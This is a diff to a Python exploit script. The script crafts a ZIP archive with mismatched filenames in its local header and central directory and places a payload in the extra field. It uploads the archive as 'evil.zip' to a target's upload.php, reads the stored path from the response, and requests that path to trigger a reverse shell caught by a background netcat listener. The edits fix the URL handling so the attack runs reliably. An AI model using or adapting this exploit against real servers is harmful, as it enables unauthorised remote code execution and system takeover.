@@ -47,7 +47,7 @@ class Zip:
     local_file_header += struct.pack('<L',crc32_checksum)        # checksum in little endian format
     local_file_header += struct.pack('<L',length)                # compressed size
     local_file_header += struct.pack('<L',length)                # uncompressed size
-    local_file_header += struct.pack('<H',len(filename1))         # filename length, maybe try with <L just for shits and giggles
+    local_file_header += struct.pack('<H',len(filename1))        # filename length
     local_file_header += b'\x00\x00'                             # extra field length
     local_file_header += filename1 # filename
     local_file_header += payload   # extra field
@@ -64,14 +64,14 @@ class Zip:
     central_directory += struct.pack('<L',crc32_checksum)        # checksum in little endian format
     central_directory += struct.pack('<L',length)                # compressed size
     central_directory += struct.pack('<L',length)                # uncompressed size
-    central_directory += struct.pack('<H',len(filename2))        # filename length, maybe try with <L just for shits and giggles
+    central_directory += struct.pack('<H',len(filename2))        # filename length
     central_directory += b'\x00\x00' # extra field length
     central_directory += b'\x00\x00' # file comment length
     central_directory += b'\x00\x00' # disk # start
     central_directory += b'\x00\x00' # internal attributes
     central_directory += b'\x00\x00\xa4\x81' # external attributes
     central_directory += b'\x00\x00\x00\x00' # offset of local header
-    central_directory += filename2    # filename
+    central_directory += filename2   # filename
 
     # Step 3. Building the end of the central directory record
     end_of_cd = b''
@@ -97,15 +97,17 @@ class Zip:
   def make_req(self,args,final_payload):
     if 'http://' not in args.target:
       url = 'http://' + args.target
-      files = {'submit':(None,''),'zipFile':('evil.zip',final_payload)}
-      r = requests.post(url + '/upload.php', files=files)
-      # Extract the actual path that we need to hit
-      for line in r.text.split('\n'):
-        if 'uploads' in line:
-          uploaded_file = line.split('"')[1].split(' ')[0]
-          # Make a GET request to trigger the revshell
-          print("\n[+] File found, triggering the revshell ...\n")
-          requests.get(url + '/' + uploaded_file)
+    else:
+      url = args.target
+    files = {'submit':(None,''),'zipFile':('evil.zip',final_payload)}
+    r = requests.post(url + '/upload.php', files=files)
+    # Extract the actual path that we need to hit
+    for line in r.text.split('\n'):
+      if 'uploads' in line:
+        uploaded_file = line.split('"')[1].split(' ')[0]
+        # Make a GET request to trigger the revshell
+        print("\n[+] File found, triggering the revshell ...\n")
+        requests.get(url + '/' + uploaded_file)
 
   # Create a thread to run nc in the background and listen on the provided port and interface
   def start_listener(self):
